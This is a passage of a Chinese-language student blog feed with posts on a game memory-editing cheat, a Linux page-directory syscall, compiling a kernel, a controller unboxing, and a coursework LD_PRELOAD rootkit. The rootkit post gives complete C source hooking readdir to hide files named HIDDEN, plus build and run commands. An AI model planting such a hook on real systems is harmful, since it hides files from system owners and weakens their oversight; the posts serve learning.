<p>那血量大致上就可推算是[[0x1bd2]+0x04]<br><br><br>下面介紹一下找基址的一種方法：</p>
<p>首先找出血量位址後</p>
<p>點選Find out what writes to this address</p>
<p><img src="/images/pic1.png" alt="圖1"></p>
<p>會跳出一個視窗 此時繼續遊戲再自殘一下</p>
<p>這個視窗會把寫入到這個位址的opcode列出來 相當方便<br><br><br><img src="/images/pic2.png" alt="圖2"></p>
<p>如此一來 就能幫助我們找到人物屬性陣列的位址</p>
<p><img src="/images/pic3.png" alt="圖3"></p>
<p>但這還不是基址 [人物陣列基址] = 人物陣列的位址<br><br><br>我們把這個位址拿去搜一下 就能找到哪個位址(基址)存放這個值</p>
<p><img src="/images/pic4.png" alt="圖4"></p>
<p>有了基址就能找各種屬性的偏移(offset)</p>
<p>因為人物屬性通常是條陣列</p>
<p>就可以亂try偏移去找一些神奇的屬性(x,y座標 目前階梯數等等)</p>
<p>也許就可以開發出超酷炫的功能</p>
<p><br></p>
<h2 id="u958B_u59CB_u5BEB_u5916_u639B"><a href="#u958B_u59CB_u5BEB_u5916_u639B" class="headerlink" title="開始寫外掛"></a>開始寫外掛</h2><p>前面只教怎麼開發屬性和找基址</p>
<p>這裏正式介紹一下怎麼實作我們想要的功能</p>
<p>這裏我用C#來寫</p>
<p>下面會用到幾個函數：</p>
<ol>
<li><p>ReadProcessMemory</p>
</li>
<li><p>WriteProcessMemory</p>
</li>
<li><p>OpenProcess<br><br><br>C#要調用Win32 api可以這樣子寫：</p>
</li>
</ol>
<p><img src="/images/pic5.png" alt="圖5"></p>
<p><br></p>
<p>人物基址0x0018FD9C 血量偏移0x1170</p>
<p>則血量值即為[[0x0018FD9C]+0x1170]</p>
<p>程式中讀血量寫起來⼤概像這樣：</p>
<p><img src="/images/pic6.png" alt="圖6"></p>
<p><br></p>
<p>而WriteProcessMemory可以寫入值到記憶體中</p>
<p>故可以簡單達到血量控制的效果！</p>
<p>當然也可以控制階層數、人物座標等</p>
<p><br></p>
<p>當然還能做出一些更炫砲的功能</p>
<p>例如….滑鼠走路！！</p>
<p>方法：抓滑鼠相對於遊戲視窗的座標，Timer定時設定角色座標</p>
<p>Demo影片:<br><a href="https://drive.google.com/file/d/0B0u00oV7NdOiRWtSSWhvQVZGRHc/view?usp=sharing" target="_blank" rel="external">https://drive.google.com/file/d/0B0u00oV7NdOiRWtSSWhvQVZGRHc/view?usp=sharing</a></p>
<p><br></p>
<p>再來個沒啥用的功能…反重力</p>
<p>變小朋友上樓梯…</p>
<p>方法：找出修改y座標的opcode<br>然後把add改成sub<br>修改opcode一樣可用WriteProcessMemory<br>但盡量opcode長度改完跟原本要一樣 不然容易crash</p>
<p>反重力Demo:<br><a href="https://drive.google.com/file/d/0B0u00oV7NdOiTjd2WDd3Y1lsc3c/view?usp=sharing" target="_blank" rel="external">https://drive.google.com/file/d/0B0u00oV7NdOiTjd2WDd3Y1lsc3c/view?usp=sharing</a><br><br></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>程式碼放在github上：<br><a href="https://github.com/w181496/GoingDown" target="_blank" rel="external">https://github.com/w181496/GoingDown</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F"><a href="#u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F" class="headerlink" title="小朋友下樓梯是啥？"></a>小朋友下樓梯是啥？</h2><p>它不僅是一個很狂的小遊戲</p>
<p>它更代表了我們的童年回憶</p>
<p><br><br><img src="/images/pic7.png" alt="圖7"></p>]]>
    
    </summary>
    
      <category term="筆記" scheme="http://w181496.twbbs.org/tags/%E7%AD%86%E8%A8%98/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux project - PGD present bit]]></title>
    <link href="http://w181496.twbbs.org/2016/11/10/Linux-project-PGD-present-bit/"/>
    <id>http://w181496.twbbs.org/2016/11/10/Linux-project-PGD-present-bit/</id>
    <published>2016-11-10T14:50:31.000Z</published>
    <updated>2016-12-06T05:26:26.000Z</updated>
    <content type="html"><![CDATA[<h2 id="u524D_u60C5_u63D0_u8981"><a href="#u524D_u60C5_u63D0_u8981" class="headerlink" title="前情提要"></a>前情提要</h2><p>延續上一篇，這篇記錄Project主要內容的實作過程。</p>
<p>題目的要求是：For each page directory entry with an index located in the group of indexes specified by the parameters, this system call shows the value of the present field of the entry.</p>
<p>簡單說就是新增一個system call<br>讓它可以取得當前process的page global directory entry中的present bit<br>參數包含兩個integer代表起始和結尾index<br>和一個陣列指標參數，存放結果</p>
<a id="more"></a>
<h2 id="u904E_u7A0B"><a href="#u904E_u7A0B" class="headerlink" title="過程"></a>過程</h2><p>新增system call和compile kernel的方法都在上一篇中，這邊不再贅述。</p>
<p><img src="http://i.imgur.com/e9n5HH7.png" alt=""><br>首先我們得先知道kernel中有個current指標能取得目前執行process的task_struct<br>而current-&gt;mm則會取得跟這個process memory management相關的mm_struct<br>current-&gt;mm-&gt;pgd就指向我們page directory table的開頭位址</p>
<p>再來我們先觀察Linux在32位元下的Linear address<br><img src="http://i.imgur.com/mqdizUz.jpg" alt=""><br>Directory有10 bits、page table 10 bits、offset 22 bits<br>最左邊10 bits其實就可看作page directory的index<br>總共1024個page directory</p>
<p>我們的目標就是directory中entry的present<br>要得到某個page directory table中的entry可以用下面這種方式：<br>current-&gt;mm-&gt;pgd[index]<br>它是一條長度1024的pgd_t陣列</p>
<p>有了page directory entry後<br>page directory entry的value第一位bit其實就是present bit</p>
<p><img src="http://wiki.osdev.org/images/9/94/Page_dir.png" alt=""></p>
<p>那就可以像下面這樣子取得present bit:<br>pgd_val(current-&gt;mm-&gt;pgd[index]) &amp; 0x01</p>
<p>pgd_val是取得pgd_t實際的值</p>
<p>最後的程式碼：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;asm/current.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;asm/pgtable.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">sys_address_space_survey</span><span class="params">(<span class="keyword">int</span> first, <span class="keyword">int</span> last, <span class="keyword">int</span> *result)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pgd_t</span> *pgd = current-&gt;mm-&gt;pgd; <span class="comment">//base address of pgd table</span></span><br><span class="line">    <span class="keyword">int</span> pst;</span><br><span class="line">    <span class="keyword">int</span> addr = first;</span><br><span class="line">    <span class="keyword">while</span>(addr &lt;= last) &#123;</span><br><span class="line">        pst = pgd_val(pgd[addr]) &amp; <span class="number">0x1</span>; <span class="comment">//get present bit</span></span><br><span class="line">        result[addr] = pst;</span><br><span class="line">        printk(<span class="string">"pgd[%d] present bit is %x\n"</span>, addr, pst);</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然後編譯kernel時PAE記得關<br>不然結果會不正確<br>make meunconfig時取消PAE(Ubuntu這版本預設有開)<br>Processor type and features -&gt; High Memory Support -&gt; off<br><img src="http://i.imgur.com/4axf392.png" alt=""></p>
<h2 id="u7D50_u679C"><a href="#u7D50_u679C" class="headerlink" title="結果"></a>結果</h2><p><img src="http://i.imgur.com/7ORN2Z4.jpg" alt=""><br><img src="http://i.imgur.com/uXqiE8H.jpg" alt=""></p>
<p>從768以下的present bit結果可觀察出三份程式中<br>都各有一段連續的present bit是1<br>但所在位置都不同，這段連續的1其實就是對應到a[SIZE]<br>仔細觀察可發現三份code的a[SIZE]陣列剛好分別在stack、bss、heap段<br>而從present bit分布狀況來看的確符合不同區段的相對位置</p>
<p>註1: 這邊必須設定過a[SIZE]陣列中的元素才會使pgd present bit被設定<br>例如：for(int i = 0; i &lt; SIZE; ++i) a[i] = i; 即可</p>
<p>註2: 因為原本SIZE有點小，可以設大一點方便觀察結果，例如設10000000<br>但因為SIZE很大，所以可能會Segmentation fault，可以用ulimit -s來增大stack size<br>(這部分感謝jxcode大神指點)</p>
<p>註3: 觀察可發現三份code在index 32那個pgd present bit都是1<br>是因為code也需要有地方存放，那其實就是存放code的區段</p>
<p>而三個程式在entry 768以上的present bit都是相同的<br>驗證了我們學過的: Kernel是映射到0xc0000000以上<br>(0xc0000000 &gt;&gt; 22 = 768)</p>
<p>整體似乎沒啥難度，主要是編kernel太花時間還有細節很多要注意的地方…<br>當初熬夜3天才做完QQ</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="u524D_u60C5_u63D0_u8981"><a href="#u524D_u60C5_u63D0_u8981" class="headerlink" title="前情提要"></a>前情提要</h2><p>延續上一篇，這篇記錄Project主要內容的實作過程。</p>
<p>題目的要求是：For each page directory entry with an index located in the group of indexes specified by the parameters, this system call shows the value of the present field of the entry.</p>
<p>簡單說就是新增一個system call<br>讓它可以取得當前process的page global directory entry中的present bit<br>參數包含兩個integer代表起始和結尾index<br>和一個陣列指標參數，存放結果</p>]]>
    
    </summary>
    
      <category term="Linux" scheme="http://w181496.twbbs.org/tags/Linux/"/>
    
      <category term="NCU" scheme="http://w181496.twbbs.org/tags/NCU/"/>
    
      <category term="筆記" scheme="http://w181496.twbbs.org/tags/%E7%AD%86%E8%A8%98/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux Kernel編譯+新增System call(Ubuntu)]]></title>
    <link href="http://w181496.twbbs.org/2016/11/07/Linux-Kernel%E7%B7%A8%E8%AD%AF-Ubuntu/"/>
    <id>http://w181496.twbbs.org/2016/11/07/Linux-Kernel編譯-Ubuntu/</id>
    <published>2016-11-07T07:34:15.000Z</published>
    <updated>2016-11-30T15:38:11.000Z</updated>
    <content type="html"><![CDATA[<h2 id="u524D_u60C5_u63D0_u8981"><a href="#u524D_u60C5_u63D0_u8981" class="headerlink" title="前情提要"></a>前情提要</h2><p>因Linux Operating System課的project需要，人生第一次編Kernel就獻給他惹，所以怕忘就順手筆記一下。</p>
<h2 id="u74B0_u5883"><a href="#u74B0_u5883" class="headerlink" title="環境"></a>環境</h2><p>使用Ubuntu 16.04 LTS i386 Desktop<br>要編的Kernel是3.10版</p>
<h2 id="u904E_u7A0B"><a href="#u904E_u7A0B" class="headerlink" title="過程"></a>過程</h2><p>一開始當然要先裝好Linux環境(我是裝Ubuntu)<br>然後決定你要編的Kernel，並載下來解壓縮<br>(Kernel source可以到<a href="https://www.kernel.org" target="_blank" rel="external">https://www.kernel.org</a> 下載)<br>我這邊解壓縮出來後是linux-3.10.104/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-3.10.104/</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>進去之後，要新增一個system call<br>創一個資料夾用來放我們system call的code</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir mycall&#10;$ cd mycall</span><br></pre></td></tr></table></figure>
<p>新增一個檔案helloworld.c，就是我們system call的程式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim helloworld.c</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">sys_helloworld</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(<span class="string">"kaibro ininder\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再來新增Makefile，用來確保我們的程式會被編譯進Kernel</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim Makefile&#10;obj-y := helloworld.o</span><br></pre></td></tr></table></figure>
<p>再來回上一層目錄，修改Makefile</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd ..&#10;$ vim Makefile&#10;core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/&#10;&#25214;&#21040;&#36889;&#34892;&#65292;&#22312;&#26368;&#24460;&#38754;&#26032;&#22686; mycall/&#10;&#10;core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ mycall/</span><br></pre></td></tr></table></figure>
<p>這是為了告訴它，我們新的system call的source files在mycall資料夾裡</p>
<p>再來我們要新增我們的system call到system call table裡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// &#22914;&#26524;&#26159;64&#20301;&#20803;&#31995;&#32113;&#65292;&#23601;&#26159;syscall_64.tbl&#10;$ vim arch/x86/syscalls/syscall_32.tbl&#10;&#10;&#22312;&#26368;&#24460;&#38754;&#26032;&#22686;&#19968;&#34892;&#65292;&#21407;&#26412;system call&#21482;&#21040;350&#34399;&#65292;&#25152;&#20197;&#36889;&#37002;&#23601;&#22635;351&#34399;&#10;351   i386  helloworld  sys_helloworld</span><br></pre></td></tr></table></figure>
<p>再來修改system call header</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim include/linux/syscalls.h&#10;&#10;&#22312;&#26368;&#19979;&#38754;(#endif&#21069;)&#26032;&#22686;&#19968;&#34892;&#10;asmlinkage int helloworld(void);&#10;&#10;&#36889;&#23450;&#32681;&#20102;&#25105;&#20497;system call&#30340;prototype&#10;asmlinkage&#20195;&#34920;&#25105;&#20497;&#30340;&#21443;&#25976;&#37117;&#21487;&#20197;&#22312;stack&#35041;&#21462;&#29992;</span><br></pre></td></tr></table></figure>
<p>接著編譯kernel前要裝一些套件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure>
<p>還有設定檔</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo make menuconfig&#10;// &#36889;&#37002;&#25105;&#37117;&#29992;&#38928;&#35373;&#30340;&#10;$ sudo make oldconfig</span><br></pre></td></tr></table></figure>
<p>最後就開始漫長的compile了！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo make</span><br></pre></td></tr></table></figure>
<p>編完之後，就安裝到我們系統上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo make modules_install install</span><br></pre></td></tr></table></figure>
<p>裝好之後沒問題，就重開機，用我們新的kernel開機</p>
<p>但是grub選單，預設好像是關的</p>
<p>所以我們要先把它打開，再重開機</p>
<p>重開時記得選我們編的kernel</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/default/grub&#10;&#20687;&#25105;&#19968;&#27171;&#25214;&#21040;&#19979;&#38754;&#36889;&#20841;&#34892;&#65292;&#21069;&#38754;&#21152;#&#65292;&#25226;&#20182;&#20497;&#35387;&#35299;&#25481;&#10;#GRUB_HIDDEN_TIMEOUT=0&#10;#GRUB_HIDDEN_TIMEOUT_QUIET=true&#10;&#10;&#28982;&#24460;&#26356;&#26032;&#10;$ sudo update-grub&#10;&#20043;&#24460;&#37325;&#38283;&#27231;&#23601;&#33021;&#30475;&#21040;&#36984;&#21934;&#20102;</span><br></pre></td></tr></table></figure>
<p>最後寫個小程式來檢驗是否成功新增system call</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = syscall(<span class="number">351</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然後執行之後，用以下這指令看kernel有沒有輸出我們想要的訊息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dmesg</span><br></pre></td></tr></table></figure>
<p>如果有看到”kaibro ininder”，就代表成功惹～</p>
<h2 id="u5F8C_u8A18"><a href="#u5F8C_u8A18" class="headerlink" title="後記"></a>後記</h2><p>其實一開始我是裝Fedora<br>但不知為何總是一直失敗<br>一開始是虛擬機空間開太小<br>後來好不容易重灌好，也編完，卻莫名無法開機<br>想說是編太新版的Kernel炸掉，結果重編個相同版本的Kernel還是一樣<br>(前前後後大概編了6次吧….)<br>之後就果斷改用Ubuntu…</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="u524D_u60C5_u63D0_u8981"><a href="#u524D_u60C5_u63D0_u8981" class="headerlink" title="前情提要"></a>前情提要</h2><p>因Linux Operating System課的project需要，人生第一次編Kernel就獻給他惹，所以怕忘就順手筆記一下。</p>
<h2 id="u74B0_u5883"><a href="#u74B0_u5883" class="headerlink" title="環境"></a>環境</h2><p>使用Ubuntu 16.04 LTS i386 Desktop<br>要編的Kernel是3.10版</p>
<h2 id="u904E_u7A0B"><a href="#u904E_u7A0B" class="headerlink" title="過程"></a>過程</h2><p>一開始當然要先裝好Linux環境(我是裝Ubuntu)<br>然後決定你要編的Kernel，並載下來解壓縮<br>(Kernel source可以到<a href="https://www.kernel.org">https://www.kernel.org</a> 下載)<br>我這邊解壓縮出來後是linux-3.10.104/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-3.10.104/</span><br></pre></td></tr></table></figure>]]>
    
    </summary>
    
      <category term="Linux" scheme="http://w181496.twbbs.org/tags/Linux/"/>
    
      <category term="NCU" scheme="http://w181496.twbbs.org/tags/NCU/"/>
    
      <category term="筆記" scheme="http://w181496.twbbs.org/tags/%E7%AD%86%E8%A8%98/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[DJ DAO FB9 Jubeat控制器開箱]]></title>
    <link href="http://w181496.twbbs.org/2016/02/07/DJ-DAO-FB9-Jubeat%E6%8E%A7%E5%88%B6%E5%99%A8%E9%96%8B%E7%AE%B1/"/>
    <id>http://w181496.twbbs.org/2016/02/07/DJ-DAO-FB9-Jubeat控制器開箱/</id>
    <published>2016-02-07T14:53:32.000Z</published>
    <updated>2016-02-07T16:54:59.000Z</updated>
    <content type="html"><![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>有鑒於過去一年打ju實在燒太多錢了，但要戒掉也沒那麼容易<br>於是就有買controller的念頭，這樣就可以在家打ju，不用一直燒錢了!<br>所以一開始我就先買了一台27吋的螢幕<br>一方面可以當控制器的螢幕，另一方面可以雙螢幕coding或看影片，整個爽度十足<br>然後存了一段時間的錢後，就上淘寶買了看起來價格便宜內容又實在的DJ DAO控制器FB9<br><a id="more"></a><br>在下單後，其實還發生一連串瑣碎的麻煩事<br>一開始因為我沒有信用卡和金融卡，所以付款超麻煩<br>後來才找了個代付網站成功付款<br>結果過幾天看到淘寶居然推出超商付款的功能，害我白忙了那麼久QQ</p>
<p>付完錢後過了幾天，賣家一直遲遲沒出貨也沒消息<br>無聊裝個阿里旺旺才知道，原來賣家幾天前用這玩意兒傳訊息討論運費的事<br>淘寶網站居然不會有通知，有點被雷到的感覺<br>後來補繳完運費才順利出貨</p>
<p>另外，過年前一天，我傳訊息問貨運客服商品狀況，他回我他們已經放假，所以商品未簽收<br>然後晚上我就收到包裹了 囧….客服根本耍我</p>
<h2 id="u958B_u7BB1"><a href="#u958B_u7BB1" class="headerlink" title="開箱"></a>開箱</h2><p><img src="http://i.imgur.com/Y98KAgD.jpg?1" alt="箱"><br>箱子超大箱</p>
<p><br><br><img src="http://i.imgur.com/ScqWWmO.jpg" alt="1"><br>打開來看到控制器鍵盤</p>
<p><br><br><img src="http://i.imgur.com/4sHrhYY.jpg" alt="2"><br>還有一些小零件，像支架、螺絲、可替換導電橡膠等</p>
<p><br><br><img src="http://i.imgur.com/0UpAO6s.jpg" alt="3"><br>把控制器拿出來後的樣子</p>
<p><br><br><img src="http://i.imgur.com/JAF4izY.jpg" alt="4"><br>近距離觀看，可以發現按鈕邊緣稜角做的和機台幾乎一樣</p>
<p><br><br><img src="http://i.imgur.com/obyTJZ6.jpg" alt="5"><br>控制器背面，是一塊透明玻璃</p>
<p><br><br><img src="http://i.imgur.com/46UUm5k.jpg" alt="6"><br>裝螢幕背後的支架，那塊金屬片不知為啥拿到時就髒髒的</p>
<p><br><br><img src="http://i.imgur.com/BF6ajAu.jpg" alt="7"><br>一些小配件，傳輸線、螺絲等</p>
<p><br><br><img src="http://i.imgur.com/y59XNl6.jpg?1" alt="8"><br>控制器組裝完的樣子!!<br>外觀其實還不錯看<br>螢幕架起來後，就放在控制器下面</p>
<p><br><br><img src="http://i.imgur.com/EtnGhhi.jpg" alt="9"><br>後來測試發現不知為啥15號鍵不正常<br>按了沒反應，重接線後按其他顆鍵會一直卡15號鍵<br>所以就把背板打開喬正導電橡膠，和清理一下面板</p>
<p><br><br><img src="http://i.imgur.com/kpLcN1e.jpg" alt="10"><br>五顏六色的線整理成一捆</p>
<p><br></p>
<h2 id="u6E2C_u8A66"><a href="#u6E2C_u8A66" class="headerlink" title="測試"></a>測試</h2><p>下面是我測試的影片，因為拍攝角度有點難喬<br>所以整個畫面有點看不太到整個控制器<br>(P.S. 這是以網路上找到的jubeat analyser來測試的)</p>
<iframe width="504" height="378" src="http://www.youtube.com/embed/yssy60l8STI"><br></iframe>

<p>整體來說，按鍵按起來手感還蠻特別的，對比機台較有段落感<br>(似乎是因為導電橡膠的關係?)<br>所以有時打起來跟機台不太一樣，一個很難形容的感覺<br>(不過聽說機台也是用差不多的導電橡膠，手感為啥會不太一樣就不知了..)<br>然後打的時候聲音還蠻大的，這部分如果可以改善的話應該會更好<br>不然深夜時分打，很容易吵到鄰居或家人</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>有鑒於過去一年打ju實在燒太多錢了，但要戒掉也沒那麼容易<br>於是就有買controller的念頭，這樣就可以在家打ju，不用一直燒錢了!<br>所以一開始我就先買了一台27吋的螢幕<br>一方面可以當控制器的螢幕，另一方面可以雙螢幕coding或看影片，整個爽度十足<br>然後存了一段時間的錢後，就上淘寶買了看起來價格便宜內容又實在的DJ DAO控制器FB9<br>]]>
    
    </summary>
    
      <category term="開箱文" scheme="http://w181496.twbbs.org/tags/%E9%96%8B%E7%AE%B1%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[攻防Project2 - LD_PRELOAD實作library rootkit]]></title>
    <link href="http://w181496.twbbs.org/2016/01/18/project2/"/>
    <id>http://w181496.twbbs.org/2016/01/18/project2/</id>
    <published>2016-01-18T07:36:24.000Z</published>
    <updated>2016-01-19T14:41:46.000Z</updated>
    <content type="html"><![CDATA[<h2 id="LD_PRELOAD"><a href="#LD_PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>LD_PRELOAD是Linux/Unix下的環境變數，他可以決定預先要載入的共享函式庫<br>它比LD_LIBRARY_PATH指定的共用函式庫還要優先，因此LD_PRELOAD裡的全域符號會蓋掉後面載入的同名全域符號<br>所以我們可以利用LD_PRELOAD來達成Linux/Unix下的hook，要達到rootkit的效果也就輕而易舉<br>但這只對動態連結的程式有效，因為靜態連結函式庫的代碼都已經包進程式中</p>
<h2 id="u5BE6_u4F5C"><a href="#u5BE6_u4F5C" class="headerlink" title="實作"></a>實作</h2><p>因為ls用到readdir這個函數來實作<br>所以我們覆蓋掉libc裡面的readdir來實作rootkit<br>做法很簡單，載入libc中原本的readdir(我們叫它old_readdir)<br>然後把結果中有”HIDDEN”的都濾掉</p>
<p>code如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *libc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> dirent *(*old_readdir)(DIR *dirp);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">struct</span> dirent *<span class="title">readdir</span><span class="params">(DIR *dirp)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> dirent *ret = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == libc) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == (libc = dlopen(<span class="string">"/lib/libc.so.6"</span>, RTLD_LAZY))) &#123;</span><br><span class="line">			<span class="keyword">goto</span> END;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == old_readdir) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == (old_readdir = dlsym(libc, <span class="string">"readdir"</span>))) &#123;</span><br><span class="line">			<span class="keyword">goto</span> END;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		ret = old_readdir(dirp);</span><br><span class="line">		<span class="keyword">if</span> (ret &amp;&amp; <span class="number">0</span> == <span class="built_in">strcmp</span>(ret-&gt;d_name, <span class="string">"HIDDEN"</span>)) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>編譯一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fPIC -shared -o rootkit.so rootkit.c</span><br></pre></td></tr></table></figure></p>
<p>設置LD_PRELOAD並執行ls<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /bin/ls&#10;rootkit.c rootkit.so HIDDEN&#10;$ env LD_PRELOAD=./rootkit.so /bin/ls&#10;rootkit.c rootkit.so</span><br></pre></td></tr></table></figure></p>
<p>即可發現當前目錄下名字為HIDDEN的都消失了，就算下參數-al也一樣</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="LD_PRELOAD"><a href="#LD_PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>LD_PRELOAD是Linux/Unix下的環境變數，他可以決定預先要載入]]>
    </summary>
    
      <category term="NCU" scheme="http://w181496.twbbs.org/tags/NCU/"/>
    
      <category term="筆記" scheme="http://w181496.twbbs.org/tags/%E7%AD%86%E8%A8%98/"/>
    
  </entry>
  
  <entry>
